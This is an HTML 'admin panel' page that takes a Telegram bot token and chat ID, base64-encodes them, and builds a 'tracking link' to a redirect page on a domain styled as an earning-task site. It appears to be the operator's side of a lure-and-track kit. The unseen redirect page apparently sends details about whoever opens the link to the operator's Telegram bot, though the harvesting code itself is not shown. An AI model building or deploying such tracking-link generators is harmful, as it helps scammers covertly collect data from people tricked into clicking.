<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel - Link Generator</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: linear-gradient(135deg, #667eea, #764ba2); min-height: 100vh; color: white; display: flex; justify-content: center; align-items: center; }
        .container { max-width: 500px; width: 90%; background: rgba(255,255,255,0.1); padding: 30px; border-radius: 15px; backdrop-filter: blur(10px); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        h2 { text-align: center; margin-bottom: 25px; color: white; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; }
        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.3); background: rgba(255,255,255,0.1); color: white; font-size: 14px; }
        input:focus { outline: none; border-color: #00ff88; }
        button { width: 100%; padding: 15px; background: linear-gradient(45deg, #00ff88, #00cc6a); border: none; border-radius: 8px; color: #000; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,136,0.4); }
        .generated-link { margin-top: 25px; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; word-break: break-all; font-family: monospace; font-size: 14px; border: 1px dashed rgba(255,255,255,0.2); display: none; }
        .copy-btn { margin-top: 15px; background: linear-gradient(45deg, #667eea, #764ba2); color: white; }
        .toast { position: fixed; bottom: 20px; right: 20px; background: #00ff88; color: #000; padding: 15px 25px; border-radius: 8px; font-weight: bold; transform: translateX(400px); transition: 0.3s; }
        .toast.show { transform: translateX(0); }
    </style>
</head>
<body>
    <div class="container">
        <h2>ðŸ”§ Admin Panel - Link Generator</h2>
        
        <div class="input-group">
            <label>ðŸ¤– Telegram Bot Token</label>
            <input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklMNOPqrSTUVwxyZ">
        </div>
        
        <div class="input-group">
            <label>ðŸ’¬ Chat ID</label>
            <input type="text" id="chatId" placeholder="123456789">
        </div>
        
        <button onclick="generateLink()">ðŸ”— Generate Tracking Link</button>
        
        <div class="generated-link" id="linkBox">
            <strong>Generated Link:</strong><br>
            <span id="generatedLink"></span>
        </div>
        
        <button class="copy-btn" onclick="copyLink()" id="copyBtn" style="display:none;">ðŸ“‹ Copy Link</button>
    </div>
    
    <div class="toast" id="toast"></div>
    
    <script>
        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 3000);
        }
        
        function generateLink() {
            const botToken = document.getElementById('botToken').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            
            if(!botToken || !chatId) {
                showToast("âŒ Please enter both Bot Token and Chat ID");
                return;
            }
            
            // Encode for URL
            const encodedToken = btoa(botToken);
            const encodedChatId = btoa(chatId);
            
            // Generate unique tracking ID
            const trackingId = 'TRK' + Date.now() + Math.random().toString(36).substr(2, 6).toUpperCase();
            
            // Create the redirect link with parameters
            const baseLink = "https://real-earning-task.vercel.app/site/redirect.html";
            const finalLink = `${baseLink}?tid=${trackingId}&token=${encodedToken}&chat=${encodedChatId}`;
            
            // Show generated link
            document.getElementById('generatedLink').textContent = finalLink;
            document.getElementById('linkBox').style.display = 'block';
            document.getElementById('copyBtn').style.display = 'block';
            
            showToast("âœ… Link generated successfully!");
        }
        
        function copyLink() {
            const link = document.getElementById('generatedLink').textContent;
            navigator.clipboard.writeText(link).then(() => {
                showToast("ðŸ“‹ Link copied to clipboard!");
            });
        }
    </script>
</body>
</html>
